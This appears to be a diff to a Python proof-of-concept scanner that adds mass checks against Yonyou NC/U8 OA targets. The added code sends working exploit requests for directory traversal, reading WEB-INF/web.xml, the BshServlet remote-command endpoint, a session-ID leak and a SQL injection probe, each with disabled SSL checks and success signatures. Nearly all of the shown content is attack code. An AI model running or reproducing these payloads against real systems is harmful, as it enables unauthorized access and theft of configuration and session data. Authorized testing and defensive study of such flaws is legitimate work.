@@ -1,4 +1,14 @@
 #!/usr/bin/python
+'''
+未覆盖文件上传类POC
+1. ES数据库漏洞POC
+2. nacos漏洞POC
+3. tomcat漏洞POC
+4. fastjson漏洞POC
+5. 致远OA漏洞POC
+6. 用友OA漏洞POC
+'''
+
 import requests
 import basic
 import sys
@@ -16,6 +26,7 @@ from config import jndi_server
 import random
 from fake_useragent import UserAgent
 from basic import generate_random_ip
+import re
 
 
 # elasticsearch数据库相关漏洞扫描
@@ -691,6 +702,100 @@ def seeyon_vuln_scan():
         except:
             pass
 
+# 用友OA漏洞POC扫描
+def yonsuite_vuln_scan():
+    # 获取当前时间
+    now = datetime.now()
+    # 格式化时间，只保留时、分、秒
+    formatted_time = now.strftime("%H:%M:%S")
+    url_list = basic.url_file_ip_list()
+    hearder={
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
+    }
+    for url in url_list:
+        print("\n")
+        print("----------------------"+url+"----------------------")
+        # 1、用友 ERP-NC NCFindWeb 目录遍历漏洞
+        yonsuite_ncfindweb_dir = "/NCFindWeb?service=IPreAlertConfigService&filename="
+        try:
+            # 忽略ssl证书验证
+            yonsuite_ncfindweb_res = requests.get(url+yonsuite_ncfindweb_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
+            yonsuite_ncfindweb_res.encoding='utf-8'
+            yonsuite_ncfindweb_res_text = yonsuite_ncfindweb_res.text
+        
+            if yonsuite_ncfindweb_res.status_code == 200 and  'licence.txt' in yonsuite_ncfindweb_res_text and 'Client' in yonsuite_ncfindweb_res_text and 'InstallProperties_zh.properties' in yonsuite_ncfindweb_res_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_ncfindweb_dir+" "+"存在用友 ERP-NC NCFindWeb 目录遍历漏洞")
+            else:
+                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 ERP-NC NCFindWeb 目录遍历漏洞")
+        except:
+            pass
+    
+        # 2、用友 NC NCFindWeb 任意文件读取漏洞
+        yonsuite_ncfindweb_file_dir = "/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
+        try:
+            # 忽略ssl证书验证
+            yonsuite_ncfindweb_file_res = requests.get(url+yonsuite_ncfindweb_file_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
+            yonsuite_ncfindweb_file_res.encoding='utf-8'
+            yonsuite_ncfindweb_file_res_text = yonsuite_ncfindweb_file_res.text
+        
+            if yonsuite_ncfindweb_file_res.status_code == 200 and  'web-app' in yonsuite_ncfindweb_file_res_text and 'listener-class' in yonsuite_ncfindweb_file_res_text and 'filter-mapping' in yonsuite_ncfindweb_file_res_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_ncfindweb_file_dir+" "+"存在用友 NC NCFindWeb 任意文件读取漏洞")
+            else:
+                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 NC NCFindWeb 任意文件读取漏洞")
+        except:
+            pass
+    
+        # 3、用友 NC bsh.servlet.BshServlet 远程命令执行漏洞
+        yonsuite_bashservlet_dir = "/servlet/~ic/bsh.servlet.BshServlet"
+        try:
+            # 忽略ssl证书验证
+            yonsuite_bashservlet_res = requests.get(url+yonsuite_bashservlet_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
+            yonsuite_bashservlet_res.encoding='utf-8'
+            yonsuite_bashservlet_res_text = yonsuite_bashservlet_res.text
+        
+            if yonsuite_bashservlet_res.status_code == 200 and  'BeanShell' in yonsuite_bashservlet_res_text and 'Script' in yonsuite_bashservlet_res_text and 'Display' in yonsuite_bashservlet_res_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_bashservlet_dir+" "+"存在用友 NC bsh.servlet.BshServlet 远程命令执行漏洞")
+            else:
+                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 NC bsh.servlet.BshServlet 远程命令执行漏洞")
+        except:
+            pass
+
+        # 4、用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞
+        yonsuite_getSessionList_dir = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+        try:
+            # 忽略ssl证书验证
+            yonsuite_getSessionList_res = requests.get(url+yonsuite_getSessionList_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
+            yonsuite_getSessionList_res.encoding='utf-8'
+            yonsuite_getSessionList_res_text = yonsuite_getSessionList_res.text
+            # 正则表达式模式
+            pattern = r'[A-Z0-9]{32}'
+            result = re.findall(pattern,yonsuite_getSessionList_res_text)
+            # 返回包返回姓名和32位大写字母+数字组合，正则返回列表
+            result_len = len(result)
+        
+            if yonsuite_getSessionList_res.status_code == 200 and  'SessionList' in yonsuite_getSessionList_res_text and 'Session' in yonsuite_getSessionList_res_text and 'usrID' in yonsuite_getSessionList_res_text and result_len >= 1:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_getSessionList_dir+" "+"存在用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞")
+            else:
+                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞")
+        except:
+            pass
+        # 5、用友 U8 OA test.jsp SQL注入漏洞
+        yonsuite_testsql_dir = "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"
+        try:
+            # 忽略ssl证书验证
+            yonsuite_testsql_res = requests.get(url+yonsuite_testsql_dir,headers=hearder,allow_redirects=False,timeout=1,verify=False)
+            yonsuite_testsql_res.encoding='utf-8'
+            yonsuite_testsql_res_text = yonsuite_testsql_res.text
+            
+            if yonsuite_testsql_res.status_code == 200 and  'MD5' in yonsuite_testsql_res_text and 'c4ca4238a0b923820dcc509a6f75849b' in yonsuite_testsql_res_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_testsql_dir+" "+"存在用友 U8 OA test.jsp SQL注入漏洞")
+            else:
+                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 U8 OA test.jsp SQL注入漏洞")
+        except:
+            pass
+
+
+
         
            
 
@@ -714,7 +819,9 @@ if __name__ == "__main__":
         elif func_name == 'phpmyadmin_vuln_scan':
             phpmyadmin_vuln_scan()
         elif func_name == 'seeyon_vuln_scan':
-            seeyon_vuln_scan()            
+            seeyon_vuln_scan()
+        elif func_name == 'yonsuite_vuln_scan':
+            yonsuite_vuln_scan()                
         else:
             print("Invalid function number")
     else:
